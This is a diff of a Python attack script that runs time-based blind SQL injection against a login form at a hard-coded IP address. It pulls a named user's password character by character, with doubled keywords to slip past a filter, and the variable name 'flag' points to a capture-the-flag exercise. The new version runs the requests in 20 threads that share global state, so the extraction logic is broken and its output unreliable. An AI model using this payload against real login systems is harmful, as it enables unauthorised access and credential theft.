@@ -1,13 +1,16 @@
 import requests
 import time
+from concurrent.futures import ThreadPoolExecutor
 
 # Define the URL and the POST data
 url = "http://140.115.59.7:12005/"
 data = {
     "username": None,
     "password": "arbitrary password",
-    "submit": "",
+    "submit": ""
 }
+
+# Rest of your headers and character lists remain unchanged...
 
 # Headers based on the provided HTTP request
 headers = {
@@ -30,36 +33,30 @@ uppercase_letters = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
 digits = list('0123456789')
 special_characters = list('!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~\\')
 
-# Combine all the characters
-combined_list = (
-    lowercase_letters + 
-    uppercase_letters + 
-    digits + 
-    special_characters
-)
+def make_request(char):
+    global flag, count
+    data["username"] = f"' oorr IF((BINARY SUBSTRING((sselectelect `passwoorrd` from users wwherehere `username`='idtjohn88'),{count},1)='{char}'), SLEEP(1),0) -- "
+
+    start_time = time.time()
+    response = requests.post(url, data=data, headers=headers)
+    end_time = time.time()
+
+    duration = end_time - start_time
+    print("char: " + char + "  Duration: " + str(duration) + " seconds")
+
+    if duration > 5:
+        flag += char
+        print(flag)
+        count += 1
+
+combined_list = lowercase_letters + uppercase_letters + digits + special_characters
 
 flag = ""
 count = 1
+
 # Measure the time taken for the request
-while True:
-    for char in combined_list:
-        # SQL injection
-        data["username"] = f"' oorr IF((BINARY SUBSTRING((sselectelect `passwoorrd` from users wwherehere `username`='idtjohn88'),{count},1)='{char}'), SLEEP(1),0) -- "
+with ThreadPoolExecutor(max_workers=20) as executor:  # Adjust `max_workers` as needed
+    futures = [executor.submit(make_request, char) for char in combined_list]
 
-        start_time = time.time()
-        response = requests.post(
-            url=url, 
-            data=data, 
-            headers=headers
-        )
-        end_time = time.time()
-
-        # Calculate the duration
-        duration = end_time - start_time
-        print(f"char: {char} Duration: {duration.__round__(2)} seconds")
-        # time.sleep(1)
-        if duration > 5:
-            flag = flag + char
-            print(flag)
-            count += 1
-            break
+    for future in futures:
+        future.result()
